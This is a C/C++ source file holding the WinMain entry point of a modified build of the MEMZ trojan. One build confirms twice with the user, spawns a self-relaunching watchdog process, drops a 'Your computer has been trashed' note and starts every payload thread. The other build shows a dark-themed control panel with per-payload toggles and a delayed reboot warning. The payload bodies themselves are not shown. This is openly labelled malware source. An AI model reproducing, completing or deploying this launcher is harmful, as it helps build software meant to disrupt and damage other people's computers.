int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR, int) {
    (void)hInstance;

    HMODULE hUser32 = GetModuleHandleW(L"user32.dll");
    if (hUser32) {
        pfnSetThreadDpiCtx = (PFN_SetThreadDpiCtx)
            GetProcAddress(hUser32, "SetThreadDpiAwarenessContext");
        pfnSWCA = (PFN_SWCA)
            GetProcAddress(hUser32, "SetWindowCompositionAttribute");
    }

    if (pfnSetThreadDpiCtx) {
        DPI_AWARENESS_CONTEXT prev = pfnSetThreadDpiCtx(DPI_AWARENESS_CONTEXT_UNAWARE);
        scrx=GetSystemMetrics(SM_XVIRTUALSCREEN);
        scry=GetSystemMetrics(SM_YVIRTUALSCREEN);
        scrw=GetSystemMetrics(SM_CXVIRTUALSCREEN);
        scrh=GetSystemMetrics(SM_CYVIRTUALSCREEN);
        pfnSetThreadDpiCtx(prev);
    } else {
        scrx=GetSystemMetrics(SM_XVIRTUALSCREEN);
        scry=GetSystemMetrics(SM_YVIRTUALSCREEN);
        scrw=GetSystemMetrics(SM_CXVIRTUALSCREEN);
        scrh=GetSystemMetrics(SM_CYVIRTUALSCREEN);
    }

#ifndef CLEAN
    int argc;
    LPWSTR *argv=CommandLineToArgvW(GetCommandLineW(),&argc);
    if(argc>1&&!lstrcmpW(argv[1],L"/watchdog")){
        CreateThread(NULL,NULL,&watchdogThread,NULL,NULL,NULL);
        WNDCLASSEXA c={}; c.cbSize=sizeof(c); c.lpfnWndProc=WindowProc; c.lpszClassName="hax";
        RegisterClassExA(&c);
        HWND hwnd=CreateWindowExA(0,"hax",NULL,NULL,0,0,100,100,NULL,NULL,NULL,NULL);
        MSG msg;
        while(GetMessage(&msg,NULL,0,0)>0){TranslateMessage(&msg);DispatchMessage(&msg);}
    } else {
        if(MessageBoxA(NULL,"Do you want to run MEMZ?\n\nNote: This will cause damage to your computer.","MEMZ",MB_YESNO|MB_ICONWARNING)==IDNO) ExitProcess(0);
        if(MessageBoxA(NULL,"Are you sure? MEMZ will cause serious damage!","MEMZ",MB_YESNO|MB_ICONWARNING)==IDNO) ExitProcess(0);
        WCHAR path[MAX_PATH]; GetModuleFileNameW(NULL,path,MAX_PATH);
        SHELLEXECUTEINFOW sei={sizeof(sei)}; sei.lpFile=path; sei.lpParameters=L"/watchdog"; sei.nShow=SW_SHOW;
        ShellExecuteExW(&sei);
        const char *noteMsg="Your computer has been trashed by MEMZ.\nHave a nice day :)";
        DWORD wb; HANDLE note=CreateFileA("\\note.txt",GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,0,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0);
        if(note!=INVALID_HANDLE_VALUE){WriteFile(note,noteMsg,(DWORD)lstrlenA(noteMsg),&wb,NULL);CloseHandle(note);}
        ShellExecuteA(NULL,NULL,"notepad","\\note.txt",NULL,SW_SHOWDEFAULT);
        for(int p=0;p<(int)nPayloads;p++){Sleep(payloads[p].delay);CreateThread(NULL,NULL,&payloadThread,&payloads[p],NULL,NULL);}
        for(;;)Sleep(10000);
    }
#else // CLEAN
    InitCommonControls();
    dialog=NULL;

    refreshMonitorList();
    if(nMonitors>0) updateTargetScreen(0);

    M_ROWS=((int)nPayloads+M_COLS-1)/M_COLS;
    M_WINH=M_TITLEH
          +M_ROWS*M_BTNH+(M_ROWS+1)*M_SP
          +M_SP+M_STARTALLH
          +M_SP+M_LABELH+4+M_COMBOH
          +M_SP+M_STATUSH+M_SP;

    fontTitle=CreateFontW(-18,0,0,0,FW_SEMIBOLD,0,0,0,DEFAULT_CHARSET,
        OUT_DEFAULT_PRECIS,CLIP_DEFAULT_PRECIS,CLEARTYPE_QUALITY,
        DEFAULT_PITCH|FF_SWISS,L"Segoe UI");
    fontBtn  =CreateFontW(-13,0,0,0,FW_NORMAL,0,0,0,DEFAULT_CHARSET,
        OUT_DEFAULT_PRECIS,CLIP_DEFAULT_PRECIS,CLEARTYPE_QUALITY,
        DEFAULT_PITCH|FF_SWISS,L"Segoe UI");
    fontSmall=CreateFontW(-11,0,0,0,FW_NORMAL,0,0,0,DEFAULT_CHARSET,
        OUT_DEFAULT_PRECIS,CLIP_DEFAULT_PRECIS,CLEARTYPE_QUALITY,
        DEFAULT_PITCH|FF_SWISS,L"Segoe UI");

    // Load app icon (Rhythm Doctor, embedded in resource)
    HICON hIconBig  = (HICON)LoadImageW(GetModuleHandle(NULL),
        MAKEINTRESOURCEW(1), IMAGE_ICON, 256, 256, LR_DEFAULTCOLOR);
    HICON hIconSmall= (HICON)LoadImageW(GetModuleHandle(NULL),
        MAKEINTRESOURCEW(1), IMAGE_ICON, 16, 16, LR_DEFAULTCOLOR);
    // Fallback to default if not found
    if (!hIconBig)   hIconBig   = LoadIcon(NULL, IDI_APPLICATION);
    if (!hIconSmall) hIconSmall = LoadIcon(NULL, IDI_APPLICATION);

    WNDCLASSEX c={};
    c.cbSize=sizeof(c);
    c.lpfnWndProc=WindowProc;
    c.lpszClassName=L"MEMZPanel";
    c.style=CS_HREDRAW|CS_VREDRAW;
    c.hbrBackground=(HBRUSH)GetStockObject(BLACK_BRUSH);
    c.hCursor=LoadCursor(NULL,IDC_ARROW);
    c.hIcon      = hIconBig;
    c.hIconSm    = hIconSmall;
    RegisterClassEx(&c);

    RECT rect={0,0,M_WINW,M_WINH};
    AdjustWindowRect(&rect,WS_OVERLAPPED|WS_CAPTION|WS_SYSMENU|WS_MINIMIZEBOX,FALSE);

    mainWindow=CreateWindowEx(
        WS_EX_LAYERED,
        L"MEMZPanel",
        L"\x7F51\x597D\x5361\x83CC",
        WS_OVERLAPPED|WS_CAPTION|WS_SYSMENU|WS_MINIMIZEBOX,
        50,50,rect.right-rect.left,rect.bottom-rect.top,
        NULL,NULL,GetModuleHandle(NULL),NULL);

    // Make window layered (required for Acrylic)
    SetLayeredWindowAttributes(mainWindow, 0, 255, LWA_ALPHA);

    // Enable Acrylic blur on entire window
    EnableAcrylic(mainWindow);

    // DWM dark title bar + caption color
    typedef HRESULT(WINAPI*PFN_DwmSet)(HWND,DWORD,LPCVOID,DWORD);
    HMODULE hDwm=LoadLibraryW(L"dwmapi.dll");
    if(hDwm){
        PFN_DwmSet pfn=(PFN_DwmSet)GetProcAddress(hDwm,"DwmSetWindowAttribute");
        if(pfn){
            DWORD dark=1;
            pfn(mainWindow,20,&dark,sizeof(dark)); // DWMWA_USE_IMMERSIVE_DARK_MODE
            // DWMWA_CAPTION_COLOR = 35, format is 0x00BBGGRR
            // We want a very dark navy: #0A0C1E → R=0x0A G=0x0C B=0x1E → 0x001E0C0A
            DWORD captionColor=0x001E0C0A;
            pfn(mainWindow,35,&captionColor,sizeof(captionColor));
        }
    }

    initGlobalIntensity();

    for(int p=0;p<(int)nPayloads;p++){
        payloads[p].btn=CreateWindowW(L"BUTTON",payloads[p].name,
            WS_CHILD|BS_AUTOCHECKBOX,0,0,1,1,mainWindow,NULL,
            (HINSTANCE)GetWindowLongPtr(mainWindow,GWLP_HINSTANCE),NULL);
        CreateThread(NULL,NULL,&payloadThread,&payloads[p],NULL,NULL);
    }

    int btnAreaH=M_ROWS*M_BTNH+(M_ROWS+1)*M_SP;
    int comboY=M_TITLEH+btnAreaH+M_SP+M_STARTALLH+M_SP+M_LABELH+4;
    comboMonitor=CreateWindowW(L"COMBOBOX",NULL,
        WS_VISIBLE|WS_CHILD|WS_TABSTOP|CBS_DROPDOWNLIST|CBS_HASSTRINGS,
        M_SP,comboY,M_WINW-2*M_SP,200,
        mainWindow,(HMENU)IDC_COMBO_MONITOR,
        (HINSTANCE)GetWindowLongPtr(mainWindow,GWLP_HINSTANCE),NULL);
    SendMessage(comboMonitor,WM_SETFONT,(WPARAM)fontSmall,TRUE);
    for(int m=0;m<nMonitors;m++)
        SendMessageW(comboMonitor,CB_ADDSTRING,0,(LPARAM)monitors[m].name);
    SendMessageW(comboMonitor,CB_ADDSTRING,0,(LPARAM)L"\x5168\x90E8\x5C4F\x5E55");
    autoSelectMonitorForWindow(mainWindow);

    ShowWindow(mainWindow,SW_SHOW);
    UpdateWindow(mainWindow);
    SetTimer(mainWindow,1,200,NULL);

    CreateThread(NULL,NULL,&keyboardThread,NULL,NULL,NULL);
    CreateThread(NULL,NULL,&audioThread,   NULL,NULL,NULL);

    // Reboot warning after 2 minutes (once)
    CreateThread(NULL,0,[](LPVOID)->DWORD{
        Sleep(2*60*1000);
        extern DWORD WINAPI rebootWarnThread(LPVOID);
        rebootWarnThread(NULL);
        return 0;
    },(LPVOID)NULL,0,NULL);

    MSG msg;
    while(GetMessage(&msg,NULL,0,0)>0){
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
#endif // CLEAN
    return 0;
}
